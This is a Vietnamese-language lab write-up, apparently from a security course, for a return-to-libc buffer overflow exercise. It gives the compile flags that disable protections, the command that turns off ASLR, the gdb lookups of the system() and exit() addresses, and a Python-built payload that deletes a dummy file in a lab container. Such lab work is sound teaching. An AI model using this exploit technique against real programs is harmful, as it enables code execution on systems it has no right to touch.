#### Lab3: exploit return-to-lib-c vulnerability, delete file "dummy" in directory /tmp/dummy using environment variable.
***
* 1: ánh xạ vào máy ảo docker
  ```
  docker run -it --privileged -v "C:/Users/Win 10/Seclabs:/home/seed/seclabs" img4lab
  ```
* 2: cd vào bof

  
  ![image](https://github.com/user-attachments/assets/706a5be7-0790-4efd-93a9-0b64c6ed6b1d)

* 3: biên dịch file vuln.c => vuln.out
  ```
  gcc -g vuln.c -o vuln.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2
  ```
  ![image](https://github.com/user-attachments/assets/6b20822e-61e4-471c-a4cf-8fcaebb7df23)

* 4: biên dịch file asm
  ```
  nasm -g -f elf file_del.asm
  ```
  ```
  ld -m elf_i386 -o file_del file_del.o
  ```
  ![image](https://github.com/user-attachments/assets/7c1146f4-4773-4aaf-90aa-4b0219cf5531)

* 5: xem tất cả file đã tạo ra, tạo thêm file 'dummyfile'
  ```
  ls
  ```
  ![image](https://github.com/user-attachments/assets/db9b95b2-1864-4f68-80c8-e228f241caa1)

* 6: chuyển về bash cũ
  ```
  sudo ln -sf /bin/zsh /bin/sh
  ```
  ![image](https://github.com/user-attachments/assets/877f139c-9819-4fd3-bbcd-10f9b71ee7f0)

* 7: tắt cấp phát địa chỉ ngẫu nhiên
  ```
  sudo sysctl -w kernel.randomize_va_space=0
  ```
  ![image](https://github.com/user-attachments/assets/93ff3210-b89f-41e1-b38e-9b2e36530002)

* 8: lấy đường dẫn:
  ```
  pwd
  ```
  ![image](https://github.com/user-attachments/assets/c9f5f91c-8f14-4bb0-88dd-6c6cd0566d7e)

  `/home/seed/seclabs/bof`

* 9: tạo biến toàn cục
  ```
  export my_path="/home/seed/seclabs/bof/file_del"
  ```
  ![image](https://github.com/user-attachments/assets/c128f9b8-7847-4a9c-a8a4-78687ed85be5)

* 10: điểm qua stackframe
  ![image](https://github.com/user-attachments/assets/f7d2f327-eb8e-4083-97b9-ce9337835b2b)

* 11: vào gdb và lấy địa chỉ của system(), exit(), và biến my_path
  ![image](https://github.com/user-attachments/assets/187584d7-b061-406e-9889-1a7b1c3249e2)

  
  `start`
  ```
  p system
  ```
  ```
  p exit
  ```
  ```
  find /home/seed/seclabs/Software/buffer-overflow/file_del
  ```
  ![image](https://github.com/user-attachments/assets/d709d597-e33e-46eb-a8cd-9453f6826662)

  Địa chỉ system: `0xf7e50db0` => `\xb0\x0d\xe5\xf7`

  Địa chỉ exit: `0xf7e449e0` => `\xe0\x49\xe4\xf7`

  Địa chỉ my_path: `0xffffdf53` => `\x53\xdf\xff\xff`
* 12: chạy chương trình tấn công
  ```
  r $(python -c "print('a'*68 + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' +  '\x53\xdf\xff\xff')")
  ```
  ![image](https://github.com/user-attachments/assets/4efc4b08-32c4-4cd1-bc9b-d1109727475b)

  ![image](https://github.com/user-attachments/assets/3143f40d-2525-47f0-98b4-45a8203c0fad)


  => dummyfile đã bị xóa   
  
